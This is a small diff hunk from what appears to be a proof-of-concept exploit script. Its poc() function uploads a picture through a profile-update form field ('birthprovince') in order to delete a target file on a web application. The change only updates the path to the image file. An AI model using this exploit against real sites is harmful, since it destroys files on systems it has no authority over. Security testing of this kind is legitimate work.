@@ -44,7 +44,7 @@ def poc():
 
         # upload a picture and delete the target file
         uploadurl = target.url + '?mod=spacecp&ac=profile&op=base'
-        files = {'birthprovince': ("pic.png", open('lib/plugin/pic/1.png', 'rb'))}
+        files = {'birthprovince': ("pic.png", open('plugin/resource/picture/1.png', 'rb'))}
         data = {
             'formhash': formhash,
             'profilesubmit': '1'
